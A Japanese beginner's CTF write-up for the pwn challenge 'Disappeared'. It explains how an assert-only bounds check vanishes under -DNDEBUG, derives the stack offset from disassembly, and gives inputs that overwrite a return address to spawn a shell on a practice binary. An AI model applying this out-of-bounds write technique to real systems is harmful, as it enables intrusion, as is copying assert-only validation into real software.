最近CTFにドハマりしたbaumroll1234です。

今回も初心者の私が初心者視点でなるべくわかりやすいWriteupを書いていこうと思います。

# Disappeared

## 問題

あなたの入力は検証されます! とっても安全!

```c
// gcc -DNDEBUG -o chal main.c -no-pie
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>

void win() {
    execve("/bin/sh", NULL, NULL);
}

void safe() {
    unsigned num[100], pos;
    printf("pos > ");
    scanf("%u", &pos);
    assert(pos<100);
    printf("val > ");
    scanf("%u", &num[pos]);
}

int main(void) {
    /* disable stdio buffering */
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    safe();

    return 0;
}
```

## 方針

-DNDEBUGオプションによってassertが無効化されるので普通に攻める。

## 解法

win関数はどこからも呼び出されていません。

よって、これを実行するには後述のようにsafe関数の戻り先アドレスを書き換える必要があります。

safe関数が呼び出された時の戻り先はnum[99]より高アドレスの場所に退避されています。（スタックは下方向に伸びるため。）

しかし、
```c
    assert(pos<100);
```
によってposに100以上の数値入力がブロックされるようです。

過去にscanfの戻りアドレスを書き換える問題もありましたが、今回posはunsignedなのでできません。

完全に詰みました＼(^o^)／

でも、100以上を入れたらどんな挙動をするんだろう？という好奇心から試してみると、
```sh
./chal
pos> 100
val> 0
```
あれ！？ブロックされないじゃん！？

調べてみると、-DNDEBUGをつけてコンパイルするとassertが無くなるようです。

問題タイトルがDisappeared（消えた）であることからもその方向で間違いなさそうです。

### valの値を求める

簡単なところから攻めていきましょう。

書き込みたい値はwin関数のアドレスです。

```sh
objdump -d chal | grep win
```

または

```sh
nm chal | grep win
```

を実行すると、win関数のアドレスが00000000004011b6であることがわかります。

よって、書き込む値valはこれを10進数に変換した4198838となります。

※本来はアドレスは動的に配置されるためピンポイントで攻めることはできませんが、
今回は-no-pieオプションがついているのでそれが可能になっています。

※あとこの方法だ戻り先アドレスの8バイトのうち4バイトしか書き換えられません。
今回はwin関数のアドレスと本来の戻り先アドレスの上位4バイトが同じ（ここでは0x00000000）なので可能です。

この値をsafe関数の戻り先アドレスの場所に書き込めば文字通りwinなわけですが、それはどこにあるんでしょうか？

しかもアドレスそのものではなく、num配列の要素としての添え字を求めなければいけないようです。

### posの値を求める

まず、safe関数が呼び出されたときにスタックやレジスタに何が起こるのかおさらいしましょう。

safe関数が呼び出されると、

* safe関数の戻り先アドレス（本来次に実行されるはずだったmain関数内の命令のアドレス）がスタックに積まれる。
* safe関数の頭のアドレスに飛ぶ。
* 現在のベースポインタ（スタックの底の場所）がスタックに積まれる。（ベースポインタ退避）
* 現在のベースポインタが現在のスタックポインタ（スタックのトップ）で書き換えられる。（スタックが空になる。）
* safe関数のローカル変数の領域が確保される。
* （safe関数本体の処理）
* safe関数のローカル変数の領域が解放される。
* 退避してあったベースポインタがスタックから取り出され、現在のベースアドレスが書き換えられる。（ベースポインタ復旧）
* 退避してあった戻り先アドレスがスタックから取り出され、そこに飛ぶ。

のようになります。

このsafe関数本体の処理の中で、safe関数の戻り先アドレスが格納されているところを先ほど調べたwin関数のアドレスで改ざんしてやれば、
main関数に戻ろうとしたときにまんまと騙されてwin関数に飛んでしまいます。まるで特殊サギのようですね（？）

最終的に求めたいのは、num[0]の場所から見て戻り先アドレスの位置がどれくらい上にあるか、です。

ただ、退避ベースポインタの分の8バイト＋numの分の400バイト＝408バイトだ！とかそんな単純な話でなないようです。

実際のところ、

```sh
objdump -d chal > assembly.txt
```

とかで確認してみると、

```
00000000004011da <safe>:
  4011da:	f3 0f 1e fa          	endbr64
  4011de:	55                   	push   %rbp
  4011df:	48 89 e5             	mov    %rsp,%rbp
  4011e2:	48 81 ec b0 01 00 00 	sub    $0x1b0,%rsp
```

ローカル変数のサイズはnumの400バイト＋posの4バイト＝404バイトですが、領域は0x1b0(=432)バイト分確保されています。

残りの28バイトは、パディングとか、スタック破壊検知とかのために自動的に確保されるみたいです。

しかもデバッグシンボルが無いので、gdbでprint &num[0]などの確認もできません。

しかたないのでそのままアセンブリを読み進めていきます。

1回目のprintfの直後、

```
  401207:	e8 94 fe ff ff       	call   4010a0 <printf@plt>
  40120c:	48 8d 85 5c fe ff ff 	lea    -0x1a4(%rbp),%rax
```

posのアドレスとしてベースポインタ - 0x1a4(=420)のアドレスを指定しています。

また2回目のprintfの直後、

```
  401239:	e8 62 fe ff ff       	call   4010a0 <printf@plt>
  40123e:	8b 95 5c fe ff ff    	mov    -0x1a4(%rbp),%edx
  401244:	48 8d 85 60 fe ff ff 	lea    -0x1a0(%rbp),%rax
```

より、num[0]のアドレスとしてベースポインタ - 0x1a0(=416)を指定しています。

だいぶ見えてきました。つまりこういうことでしょうか？

```
↑高アドレス
----------------------
戻り先アドレス(8)
---------------------- rbp+8
退避ベースポインタ(8)
---------------------- rbp ←ベースポインタ
？？？ (16)
----------------------
num[99]～num[0] (400)
---------------------- rbp-416
pos (4)
---------------------- rbp-420
？？？ (12)
---------------------- rbp-432 ←スタックポインタ
↓低アドレス
```

よって、戻り先アドレスがある書き換えるターゲットは、num[0]から見て424バイト上であることがわかります。

unsigned型のサイズは4バイトなので、424÷4＝106となり、posの値が求まりました。

※もっと良い方法がありそうな気もするけど…。

### 実行してみる

Linux系の環境から問題文で示されたncコマンドを実行し、

```sh
pos> 106
val> 4198838
```

のように入力します。ここでエラーも出ず終了もしなければ成功です。

シェルが取れたら、あとは簡単です。

Dockerfileを見るとフラグは/flag.txtにあるようなので、

```sh
cat /flag.txt
Alpaca{********************************************************}
```

で取得できました。

## その他

問題文の「○○は安全です！」のようわざとらしくアピールしているところは
まず疑ってかかった方がいいということを再認識しました。
